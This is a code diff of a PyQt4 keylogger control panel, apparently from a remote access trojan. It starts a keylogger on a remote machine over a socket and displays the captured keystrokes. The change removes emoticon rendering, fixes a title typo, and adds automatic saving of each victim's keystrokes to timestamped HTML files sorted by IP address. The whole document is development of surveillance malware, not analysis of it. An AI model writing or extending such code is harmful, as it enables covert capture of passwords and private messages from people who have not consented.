@@ -4,6 +4,7 @@ from PyQt4.QtCore import *
 from ast import literal_eval
 import os
 import socket
+import datetime
 
 from main_ui import Ui_Form
 
@@ -18,9 +19,8 @@ class mainPopup(QWidget, Ui_Form):
         self.socket = args['socket']
         self.ipAddress = args['ipAddress']
         self.assets = args['assets']
-        self.smilies = os.path.join(self.assets, 'smiley')
 
-        self.setWindowTitle('Keystokes from - %s - Socket #%s' % (self.ipAddress, self.socket))
+        self.setWindowTitle('Keystrokes from - %s - Socket #%s' % (self.ipAddress, self.socket))
 
         self.stopKeyloggingButton.setChecked(True)
 
@@ -32,6 +32,14 @@ class mainPopup(QWidget, Ui_Form):
         self.last_title = ''
 
     def start_logging(self):
+
+        # init folder
+        now = datetime.datetime.now()
+        folder = os.path.join('ServersData', self.ipAddress, 'Keystrokes')
+        if not os.path.exists(folder):
+            os.makedirs(folder)
+        self.keystrokes_path = os.path.join(folder, '%s-%s-%s-%s-%s.html' % (now.year, now.month, now.day, now.hour, now.minute))
+
         data = get(self.sock, 'startKeylogger', 'keyloggerstart')
         if data == 'keyloggerStarted':
             # Create a QTimer
@@ -43,26 +51,13 @@ class mainPopup(QWidget, Ui_Form):
             self.stopKeyloggingButton.setChecked(False)
             self.startKeyloggingButton.setChecked(True)
 
-    def convert_smilies(self):
-
-        def smiley(smiley_):
-            return '<img src="%s" alt="%s">' % (os.path.join(self.smilies, smiley_+'.png'), smiley_)
-
-        data = self.keystokesText.toHtml()
-        data.replace('o.O', smiley('Nerd'))
-        data.replace(':)', smiley('smile'))
-        data.replace(':D', smiley('Big-Grin'))
-        data.replace(':P', smiley('Tongue'))
-        data.replace(';)', smiley('Winking'))
-        data.replace(':(', smiley('Sad'))
-        data.replace(':O', smiley('Ligthbulb'))
-        data.replace(':*', smiley('Kiss'))
-        self.keystokesText.setHtml(data)
-
     def save(self):
         file_name = QFileDialog.getSaveFileName(self, "Save To File", "", filter="html (*.html)")
         if file_name:
             open(file_name, 'w').write(self.keystokesText.toHtml())
+
+    def auto_save(self):
+        open(self.keystrokes_path, 'w').write(self.keystokesText.toHtml())
 
     def set_logs(self):
         try:
@@ -74,9 +69,8 @@ class mainPopup(QWidget, Ui_Form):
                 self.keystokesText.moveCursor(QTextCursor.End)
                 self.keystokesText.insertHtml(result[k])
                 self.last_title = k
-            if self.smileyButton.isChecked():
-                self.convert_smilies()
-            self.keystokesText.moveCursor(QTextCursor.End)
+            if self.autoSaveButton.isChecked():
+                self.auto_save()
         except AttributeError:
             pass
         except socket.error:
